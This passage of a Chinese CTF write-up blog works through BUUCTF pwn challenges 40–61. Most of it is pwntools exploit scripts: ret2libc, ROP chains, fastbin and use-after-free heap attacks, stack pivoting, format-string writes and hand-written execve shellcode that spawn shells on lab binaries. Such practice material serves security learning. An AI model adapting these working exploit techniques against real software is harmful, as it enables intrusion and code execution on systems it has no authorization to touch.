pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080de769) # pop ecx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806c943) # int 0x80r.sendline(p)r.interactive()\n\n40 jarviso_level4ret2libc\nfrom pwn import *from LibcSearcher import *from ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28452)def dbg():    gdb.attach(p)    pause()main = elf.sym[&#x27;main&#x27;]write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]payload = b&#x27;a&#x27;*0x88+b&#x27;b&#x27;*0x4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(0x4)p.sendline(payload)write_addr = u32(p.recv(4))libc = LibcSearcher(&#x27;write&#x27;,write_addr)libc_base = write_addr-libc.dump(&#x27;write&#x27;)log.info(&#x27;libc_base:&#x27;+hex(libc_base))sys = libc_base+libc.dump(&#x27;system&#x27;)binsh = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;*0x88+b&#x27;b&#x27;*0x4+p32(sys)+p32(0)+p32(binsh)p.sendline(payload)p.interactive()\n\nbuu刷题记录（41-60题）by Maple\n41 picoctf_2018_buffer overflow 1ret2text\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29931)def dbg():    gdb.attach(p)    pause()payload = b&#x27;b&#x27;*0x28+b&#x27;b&#x27;*0x4+p32(0x80485CB)p.sendline(payload)p.interactive()\n\n42 jarvisoj_test_your_memoryret2text\n别看题上那些有的没的，有个溢出点，有个system,还有cat flag字符串，直接构造rop\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,27254)def dbg():    gdb.attach(p)    pause()sys = 0x80485C9flag_addr = 0x80487E0payload = b&#x27;b&#x27;*0x13+b&#x27;b&#x27;*0x4+p32(sys)+p32(flag_addr)p.sendline(payload)p.interactive()\n\n43 [ZJCTF 2019]EasyHeapfirstbin attack\n\n\n\n\n\n\n\n简单的菜单，增、改、删\n\n\n\n\n\n\n\n\n\n删除函数，这里置零了，没办法uaf\n\n\n\n\n\n\n\n\n\n增，最多10个\n\n\n\n\n\n\n\n\n\n改，v2不受限，有堆溢出漏洞\n\n\n同时我们看到一个不能实现的后门函数，虽然不能实现，但是为我们提供了system和/bin/sh\n那么我们如果覆盖调用函数，将free的got表换为system的plt表，就可以在使用free时，使用的是system\n利用过程\ncreat(0x68,b&#x27;a&#x27;)creat(0x68,b&#x27;b&#x27;)creat(0x68,b&#x27;c&#x27;)\n\n\n\n\n\n\n\n\n通过查ida我们可以知道heaparry的地址是0x6020e0,那么查一下看看。但是这里不能伪装堆块，因为没有记录大小，所以我们再找找有没有合适的\n\n\n\n\n\n欸，找到了这个7f，那么我们可以借助这个，伪造出来一个大小为0x7f的堆块\n\n\ndelete(2)#释放到fastbin中，进行fastbin attack，具体方式是修改fd为heap指针附近的地址payload = b&#x27;/bin/sh\\x00&#x27;+b&#x27;\\x00&#x27;*0x60+p64(0x71)+p64(0x6020ad)edit(1,payload)#在heap1中写binsh，0x6020ad是修改fd为刚才定位到的fake heap（0x6020e0-0x33)\n\n\n\n\n\n\n\n\n操作后如下所示，释放的空间有了fd、也有了size\n\n\n接下来我们就有了一个可以随意操作的堆了，那么按照先前的思路，修改free罢\ncreat(0x68,b&#x27;a&#x27;)creat(0x68,b&#x27;b&#x27;)    #创建fake heap，实际上是指针数组前面0x33payload2 = b&#x27;\\x00&#x27;*0x23+p64(elf.got[&#x27;free&#x27;])    #前面已经有0x10用来存堆头了edit(3,payload2)\n\n\n\n\n\n\n\n\n这里是执行完后的堆，可以发现啊，这里指针变为了0x602018（free的got表地址）\n\n\npayload3 = p64(elf.plt[&#x27;system&#x27;])  #覆盖free的got为system的pltedit(0,payload3)\n\n这样的话，在调用free时，是先找free的plt表，然后跳转到fre的got表再执行一次跳转，此时把free的got表改为system的plt，就会凋到system去执行\ndelete(1)\n\n这里其实是执行system(‘&#x2F;bin&#x2F;sh’)\n44 hitcontraining_uafuaf\nuaf（use after free）：free是指函数在堆上动态分配空间后不再使用该数据从而被回收，但是由于一些不当操作，导致攻击者可以操控已经被释放的区域，从而执行一些byte codes\n它的使用有以下几个条件;\n\n在free函数被调用回收buffer之后，指向该地址的指针是否被重置\n后续是否存在malloc函数可以将新申请分配的空间分配到之前被free()回收的buffer区域\n利用没有被重置的指针进行攻击\n\n接下来看一下这道题：\n\n三个功能分别是增、删、输出；同时还有一个后门函数，地址为0x8048945\n阅读一下add函数\n\n这里在关键部分写了一些注释，我们可以看到，这一个函数创建了两个堆块，分别是存放函数指针的8字节堆块和存放内容的堆块，做出示意图如下\n\n查看delete函数\n\n查看print函数\n\n执行了前面的一个puts函数，里面是内容\n那么很容易想到，我们能不能让这个指向put_note的函数，变为指向后门的函数，这样就可以直接执行后门了\n由于fastbin的机制，我们free掉申请的这两个块时，会产生的情况如下;\n8字节的chunk1指针 -&gt; chunk0指针 -&gt; tailn(&lt;40字节) -&gt; chunk1 -&gt; chunk0 -&gt; tail\n\n那么我们malloc的时候，size选择0x8，add函数中先分配指针的堆块，然后分配content的堆块\n8字节的chunk0 -&gt; tailchunk2的指针 == chunk1指针chunk2_content == chunk0指针\n\n因此打印chunk0的时候，chunk0的函数指针会指向chunk2的content,如果之前传入了后门函数，那就可以顺利执行\n详细过程\n首先我们写入两个大堆看看\nadd(16,&#x27;aaa&#x27;)add(16,&#x27;bbb&#x27;)\n\n\n\n\n\n\n\n\n紫色是第一个put_note；  绿色是第一块堆的内容；  深蓝色是第二个put_note;  黄色是第二块堆的内容\n\n\ndelete(0)delete(1)\n\n\n\n\n\n\n\n\n释放之后堆到了tcache bin中\n\n\nmagic = 0x8048945add(8, p32(magic))\n\n\n\n\n\n\n\n\n清晰的看到深蓝色这里被写入了新的put_node；  这是因为Tache的后进先出原则，蓝色被分配用于存放put_note函数和参数\n\n\n\n\n\n执行下一步：可以看到，紫色部分也被修改了。因为紫色用于我们申请的内存，并且写入magic地址，并且这里本来应该执行put_note函数的，这里执行了后门函数，因此可以getshell\n\n\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()host = &#x27;node5.buuoj.cn&#x27;post = 26483p = process(&#x27;./pwn&#x27;)#p = remote(host,post)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./pwn&#x27;)def dbg():    gdb.attach(p)    pause()    shell = 0x8048945def add(size, content):    p.sendlineafter(&#x27;choice :&#x27;,b&#x27;1&#x27;)    p.sendlineafter(&#x27;Note size :&#x27;,str(size).encode())    p.sendlineafter(&#x27;Content :&#x27;,content)def delete(idx):    p.sendlineafter(&#x27;choice :&#x27;,b&#x27;2&#x27;)    p.sendlineafter(&#x27;Index :&#x27;,str(idx).encode())def printf(idx):    p.sendlineafter(&#x27;choice :&#x27;,b&#x27;3&#x27;)    p.sendlineafter(&#x27;Index :&#x27;,str(idx).encode())add(16,&#x27;aaa&#x27;)add(16,&#x27;bbb&#x27;)#dbg()delete(0)delete(1)#dbg()add(8,p32(shell))dbg()printf(0)p.interactive()\n\n\n45 pwnable_orw沙箱\n就是ban了一些危险的函数，但是以获得flag为目的的话也不需要非得getshell\nfrom pwn import *context(arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,26440)#p = process(&#x27;./pwn&#x27;)bss = 0x804A060shellcode = shellcraft.open(&#x27;flag&#x27;)shellcode+=shellcraft.read(&#x27;eax&#x27;,bss+100,100)shellcode+=shellcraft.write(1,bss+100,100)payload = asm(shellcode)p.recvuntil(&#x27;shellcode:&#x27;)p.sendline(payload)#log.info(p.recv())p.interactive()\n\n46 picoctf_2018_buffer overflow 2from pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28047)#gdb.attach(p)payload = b&#x27;b&#x27;*0x6c+b&#x27;b&#x27;*0x4+p32(0x080485CB)+p32(0)+p32(0xDEADBEEF)+p32(0xDEADC0DE)p.sendline(payload)p.interactive()\n\n47 cmcc_simpleroprop\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29845)#gdb.attach(p)read_addr = elf.sym[&#x27;read&#x27;]pop_edx_ecx_ebx = 0x0806e850binsh = 0x80EB584int_addr = 0x80493e1\t# int 0x80pop_eax = 0x80bae06payload = b&#x27;b&#x27;*0x20+p32(read_addr)+p32(0xdeadbeef)+p32(0)+p32(binsh)+p32(0x8)payload+=p32(pop_eax)+p32(0xb)+p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(binsh)+p32(int_addr)p.sendline(payload)p.send(&#x27;/bin/sh&#x27;)p.interactive()\n\n分析分析这种纯手工构造ROP还是可以分析分析的\n\n首先是系统调用的知识，可以看这里\n\n省流一下：int 0x80就是系统调用（syscall），然后根据syscall(n)中n的值执行不同函数，其中0xb可以执行execve函数\n\n\n接下来构造ROP\n\n先是溢出覆盖，这里ida显示的不对，动态调试可以发现实际的偏移是0x1c\n\n\n我们输入的相对位置是0x24,ebp的相对位置是0x40，实际偏移0x40-0x24=0x1c\n\n\n因为程序中没有/bin/sh函数，所以我们需要调用一下read函数，以此输入一个/bin/sh进去（这里binsh的地址是bss段，因为没开PIE，所以地址所见即所得）\n\n接下来第二行就是进行系统调用了，我们要申请的函数是\nint 0x80(0xb,’/bin/sh‘, null, null);//对应寄存器eax, ebx,\t ecx,  edx\n\n这四个寄存器地址也确实可以搜到，所以根据寄存器依次输入需要的数就好\n\n\n\n\n48 [Black Watch 入群题]PWN栈迁移+ret2libc\n因为没有RWX段，所以不可以写入shellcode然后栈迁移执行\nfrom pwn import *#p = process(&#x27;./pwn&#x27;)p = remote(&quot;node5.buuoj.cn&quot;, 25707)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)main_addr = 0x8048513lea_ret_addr = 0x8048511plt_write = elf.plt[&#x27;write&#x27;]got_write = elf.got[&#x27;write&#x27;]bss_s_addr = 0x804A300payload1 = b&#x27;a&#x27; * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(got_write) + p32(4)p.sendafter(&quot;name?&quot;, payload1)payload2 = b&#x27;a&#x27; * 0x18 + p32(bss_s_addr) + p32(lea_ret_addr)p.sendafter(&quot;say?&quot;, payload2)write_addr = u32(p.recv(4))offset = write_addr - libc.symbols[&#x27;write&#x27;]binsh = offset + libc.search(&#x27;/bin/sh&#x27;).__next__()system = offset + libc.symbols[&#x27;system&#x27;]payload3 = b&#x27;aaaa&#x27; + p32(system) + b&#x27;aaaa&#x27; + p32(binsh)p.sendafter(&quot;name?&quot;, payload3)p.sendafter(&quot;say?&quot;, payload2)p.interactive()\n\n\n\n49 wustctf2020_getshell_2基础ROP\nsystem(&#x2F;sh)也可以getshell\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28502)sh = 0x08048670call_sys = 0x8048529payload = b&#x27;b&#x27;*0x18+b&#x27;b&#x27;*0x4+p32(call_sys)+p32(sh)p.recvuntil(b&#x27;\\n&#x27;)p.sendline(payload)p.interactive()\n\n50 mrctf2020_easyoverflow栈数据覆盖\n发现当check(v5)等于n0t_r3@11y_f1@g时会getshell，然后v4的读入不限制长度，可以覆盖掉v5的值\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29336)payload = b&#x27;b&#x27;*0x30+b&#x27;n0t_r3@11y_f1@g&#x27;p.sendline(payload)p.interactive()\n\n\n\n51 bbys_tu_2016ret2text\nida里面的偏移有问题，需要动态调试看看\n\n这里-14，说明偏移为14\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,25770)#gdb.attach(p)flag_addr = 0x804856Dpayload = b&#x27;b&#x27;*0x18+p32(flag_addr)p.sendline(payload)p.interactive()\n\n52 xdctf2015_pwn200ret2libc\nfrom pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)e=ELF(&#x27;./pwn&#x27;)p=remote(&#x27;node5.buuoj.cn&#x27;,25844)write_got=e.got[&quot;write&quot;]write_plt=e.plt[&quot;write&quot;]main_add=e.sym[&quot;main&quot;]payload=b&quot;a&quot;*(0x6c+4)+p32(write_plt)+p32(main_add)+p32(1)+p32(write_got)+p32(5)p.sendline(payload)p.recvuntil(&quot;Welcome to XDCTF2015~!\\n&quot;)write=u32(p.recvuntil(&#x27;\\xf7&#x27;)[-4:])print(&quot;write:&quot;,hex(write))libc_base=write-0xd43c0system = 0x3a940 + libc_basebin_sh = 0x15902b + libc_basep.recvuntil(&quot;Welcome to XDCTF2015~!\\n&quot;)payload2=b&quot;a&quot;*(0x6c+4)+p32(system)+p32(main_add)+p32(bin_sh)p.send(payload2)p.interactive()\n\n53 wustctf2020_closed重定向\nida看一下\n__int64 vulnerable()&#123;  puts(&quot;HaHaHa!\\nWhat else can you do???&quot;);  close(1);  close(2);  return shell();&#125;\n\n关闭了标准输出（1）和错误输出（2），就算是getshell了也不会得到回显。所以可以利用exec 1&gt;&amp;0将标准输出重定向到标准输入\n标准文件描述符\n标准输入（stdin）：使用文件描述符0（FD 0）表示，默认情况下终端键盘输入与其关联。\n标准输出（stdout）：使用文件描述符1（FD 1）表示，默认情况下终端屏幕显示与其关联。\n标准错误（stderr）：使用文件描述符2（FD 2）表示，默认情况下终端屏幕显示与其关联。\n\n重定向exec 1&gt;&amp;0是Shell命令行中的重定向语法，用于将标准输出重定向到标准输入，因此后续的输出会被作为输入来处理\n所以只需要nc之后输入exec 1&gt;&amp;0就可以了\n54 ciscn_2019_s_4栈迁移\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,26010)#gdb.attach(p)leave_ret = 0x08048562sys = elf.sym[&#x27;system&#x27;]payload = b&#x27;a&#x27;*0x24+b&#x27;b&#x27;*0x4p.sendafter(&#x27;name?\\n&#x27;,payload)p.recvuntil(b&#x27;bbbb&#x27;)leak_addr = u32(p.recv(4))\t#\tebp的地址泄露出来log.info(&quot;leak_addr:&quot;+hex(leak_addr))buf = leak_addr-0x38\t# 回到栈顶payload2 = p32(sys)+p32(0)+p32(buf+0xc)+b&#x27;/bin/sh\\x00&#x27;\t# payload2 = payload2.ljust(0x28,b&#x27;a&#x27;)+p32(buf-4)+p32(leave_ret)p.send(payload2)p.interactive()\n\n动态调试分析\n先看下新栈的地址为什么是ebp-0x38\n\n\n这里是寄存器的地址，可以看到我们的字符串输入到了760处、而ebp指向了798处，相差0x38字节，所以将栈迁移到这里，方便执行我们的输入\n\n\n&#x3D;&#x3D;payload2 &#x3D; (p32(sys)+p32(0)+p32(buf+0xc)+b’&#x2F;bin&#x2F;sh\\x00’).ljust(0x28,b’a’)+p32(buf-4)+p32(leave_ret)&#x3D;&#x3D;\n\np32(buf-4):将ebp覆盖为了buf-4,因为每执行一条指令之后eip会自动+4，这里将eip退回去，防止跳过指令\n\np32(leave_ret)：将返回地址覆盖为leave\n\n此时的栈结构\n\n\n\nbuf\n\n\n\n\nsys_addr\nsystem函数地址\n\n\n0\n返回地址（占位）\n\n\nbuf+12\n&#x2F;bin&#x2F;sh的参数地址\n\n\n&#x2F;bin&#x2F;sh\n\n\n\n填充的剩余空间\n\n\n\nbuf-4\n栈迁移后的ebp\n\n\nleave\n执行leave_ret\n\n\n\n\n\n\n\n55 [ZJCTF 2019]Login栈追踪？或许叭\n函数是用c++写的，看起来有点令人头大\n❯ checksec pwn[*] &#x27;/home/pwn/pwn/buuctf/55/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    Stripped:   No\n\nida查看\n\n\n在第14和16行发现要输入的账号和密码，不过肯定没有这么简单，执行看看\n❯ ./pwn _____   _  ____ _____ _____   _                _|__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __  / /_  | | |     | | | |_    | |   / _ \\ / _` | | &#x27;_ \\ / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |/____\\___/ \\____| |_| |_|     |_____\\___/ \\__, |_|_| |_|                                          |___/Please enter username: adminPlease enter password: 2jctf_pa5sw0rdPassword accepted: Password accepted:[1]    4014 segmentation fault  ./pwn\n\n&#x3D;&#x3D;寄&#x3D;&#x3D;\n看别人的汇编发现在password_checker函数中有一个隐蔽的错误\n\n\n主可以看到在0x400A54位置处有一个call rax指令，那么我们将rax修改为后门函数的地址就可以了（默认你找到那个后门函数了）\n\n\n可以在0x400A89位置处发现rax的值由var_18确定，那么去找一下var_18在哪里\n\n\n有的，兄弟，有的…\n从s处（ebp-0x60)开始，到var_18(ebp-0x18),再除去已经输入的密码2jctf_pa5sw0rd\\x00(0xe长度),我们需要填充的数据量为0x60 - 0x18 - 0xe = 0x3a\n所以exp：\nfrom pwn import *p = remote(&#x27;node5.buuoj.cn&#x27;,25872)backdoor = 0x400e88p.sendlineafter(&#x27;: &#x27;,&#x27;admin&#x27;)p.sendlineafter(&#x27;: &#x27;,b&#x27;2jctf_pa5sw0rd&#x27;+b&#x27;\\x00&#x27;*0x3a+p64(backdoor))p.interactive()\n\n56 picoctf_2018_shellcoderet2shellcode\n题比较简单，尝试了一下盲打\n❯ ./pwnEnter a string!aaaaaaaaaaaaThanks! Executing now...[1]    2462 segmentation fault  ./pwn\n\n根据运行情况，猜测是输入相关字符串并当作函数执行，所以直接写入shellcode试试\nfrom pwn import *p = remote(&#x27;node5.buuoj.cn&#x27;,28483)p.sendline(asm(shellcraft.sh()))p.interactive()\n\n然后打通了\n57 hitcontraining_magicheap施工中\n58 jarviso_level1本身应该挺简单的，但是远程和本地的输出不一样\n本地：\nfrom pwn import *context.log_level = &#x27;debug&#x27;p = process(&#x27;./pwn&#x27;)p.recvuntil(b&#x27;:&#x27;)buf_addr = int(p.recv(10),16)log.info(hex(buf_addr))payload = asm(shellcraft.sh()).ljust(0x87+0x4,b&#x27;b&#x27;)+p32(buf_addr)p.sendline(payload)p.interactive()\n\n接受buf的地址，然后ret回buf处执行shellcode\n但是远程要先输入再回显，所以只能ret2libc\nfrom pwn import *from LibcSearcher import *p=remote(&#x27;node5.buuoj.cn&#x27;,29446)elf=ELF(&quot;./pwn&quot;)main_addr=0x80484b7write_plt=elf.plt[&#x27;write&#x27;]write_got=elf.got[&#x27;write&#x27;]payload=b&#x27;a&#x27;*(0x88+0x4)+p32(write_plt)+p32(main_addr)+p32(0x1)+p32(write_got)+p32(0x4)p.send(payload)write_addr=u32(r.recv(4))libc=LibcSearcher(&#x27;write&#x27;,write_addr)libc_base=write_addr-libc.dump(&#x27;write&#x27;)system_addr=libc_base+libc.dump(&#x27;system&#x27;)bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload =b&#x27;a&#x27;*(0x88+0x4)+p32(system_addr)+p32(main_addr)+ p32(bin_sh)p.send(payload)p.interactive()\n\n59 axb 2019 fmt32fmt+ret2libc\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)#gdb.attach(p)printf_got = elf.got[&#x27;printf&#x27;]printf_plt = elf.plt[&#x27;printf&#x27;]payload = b&#x27;a&#x27;+p32(printf_got)+b&#x27;b&#x27;+b&#x27;%8$s&#x27;p.sendlineafter(b&#x27;me:&#x27;, payload)p.recvuntil(b&#x27;b&#x27;)printf_addr = u32(p.recv(4))log.info(&quot;prinf_addr:&quot;+hex(printf_addr))libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)libc_base = printf_addr - libc.dump(&#x27;printf&#x27;)sys = libc_base+libc.dump(&#x27;system&#x27;)binsh = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload2 = b&#x27;a&#x27;+fmtstr_payload(8,&#123;printf_got:system&#125;,wirte_size = &#x27;byte&#x27;,numbwritten = 0xa)p.sendline(payload2)p.sendline(&#x27;/bin/sh\\x00&#x27;)p.interactive()\n\n分析❯ checksec pwn[*] &#x27;/home/pwn/pwn/buuctf/59/pwn&#x27;    Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x8048000)    Stripped:   No\n\n\n在第25行有明显fmt漏洞,经过输入查询发现我们的输入偏移为8（但不完全是）\n\ngdb测试的时候发现第一个字符的输入是存放在了第7个偏移处，所以应该先填充一个字符，防止后来的地址出现问题\n\n在printf_got后面加一个b&#39;b&#39;为了做为recvuntil()的标记，泄露printf地址后就可以libc了\n60 cinscn_s_9shellcode\nchecksec一下\n❯ checksec pwn[*] &#x27;/home/pwn/pwn/buuctf/60/pwn&#x27;    Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX unknown - GNU_STACK missing    PIE:        No PIE (0x8048000)    Stack:      Executable    RWX:        Has RWX segments    Stripped:   No    Debuginfo:  Yes\n\n有RWX段,保护全关，估计shellcode,ida看看\nint pwn()&#123;  char s[24]; // [esp+8h] [ebp-20h] BYREF  puts(&quot;\\nHey! ^_^&quot;);  puts(&quot;\\nIt&#x27;s nice to meet you&quot;);  puts(&quot;\\nDo you have anything to tell?&quot;);  puts(&quot;&gt;&quot;);  fflush(stdout);  fgets(s, 50, stdin);  puts(&quot;OK bye~&quot;);  fflush(stdout);  return 1;&#125;void hint()&#123;  __asm &#123; jmp     esp &#125;&#125;\n\n有一个jmp esp函数，pwn函数里存在溢出点，但总计可以读入0x32字节，不够写shellcraft.sh()，所以要手写\n这边梳理一下流程\n在栈上写入小shellcode-&gt;覆盖返回地址为jmp esp-&gt;让esp指向shellcode-&gt;主动调用esp\nexp:\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;,log_level = &#x27;debug&#x27;,arch=&#x27;i386&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)shellcode = &#x27;&#x27;&#x27;xor    eax, eaxpush   eaxpush   0x68732f2fpush   0x6e69622fmov    ebx, espmov    ecx, eaxmov    edx, eaxmov    al, 0xbint    0x80&#x27;&#x27;&#x27;&#x27;shellcode = asm(shellcode)payload = shellcode.ljust(0x24,b&#x27;\\x00&#x27;)+p32(0x8048554)payload+=asm(&#x27;sub esp,0x28;call esp&#x27;)\t# 0x24+0x4=0x28p.sendline(payload)p.interactive()\n\n\n\nbuu刷题记录（61-80题）by Maple\n61 others_babystackcanary+libc\nchecksec一下\n❯ checksec pwn[*] &#x27;/home/pwn/pwn/buuctf/61/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Full RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        No PIE (0x400000)\n\nNX保护，Canary保护，所以思路应该是泄露Canary，然后泄露libc，然后ROP\n看下源码\nssize_t sub_4008B9()&#123;  sub_400826(&quot;--------&quot;);  sub_400826(&quot;1.store&quot;);  sub_400826(&quot;2.print&quot;);  sub_400826(&quot;3.quit&quot;);  sub_400826(&quot;--------&quot;);  return sub_4007F7(&quot;&gt;&gt; &quot;);&#125;int sub_400841()&#123;  char s[40]; // [rsp+10h] [rbp-30h] BYREF  unsigned __int64 v2; // [rsp+38h] [rbp-8h]  v2 = __readfsqword(0x28u);  memset(s, 0, 0x20uLL);  if ( (int)read(0, s, 0x20uLL) &lt;= 0 )    exit(1);  return atoi(s);&#125;__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  int v3; // eax  char s[136]; // [rsp+10h] [rbp-90h] BYREF  unsigned __int64 v6; // [rsp+98h] [rbp-8h]  v6 = __readfsqword(0x28u);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  memset(s, 0, 0x80uLL);  while ( 1 )  &#123;    sub_4008B9();    v3 = sub_400841();    switch ( v3 )    &#123;      case 2:        puts(s);                                // 回显Canary        break;      case 3:        return 0LL;      case 1:        read(0, s, 0x100uLL);                   // 可以溢出        break;      default:        sub_400826(&quot;invalid choice&quot;);        break;    &#125;    sub_400826(&amp;unk_400AE7);  &#125;&#125;\n\n是一个菜单，1对应输入，2对应输出（用puts）\n所以canary截断泄露，libc用puts泄露，然后构造ROP\nfrom pwn import *from struct import packcontext(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29212)#--------Canary-------payload = b&#x27;a&#x27;*(0x90-0x8)p.recvuntil(&#x27;&gt;&gt; 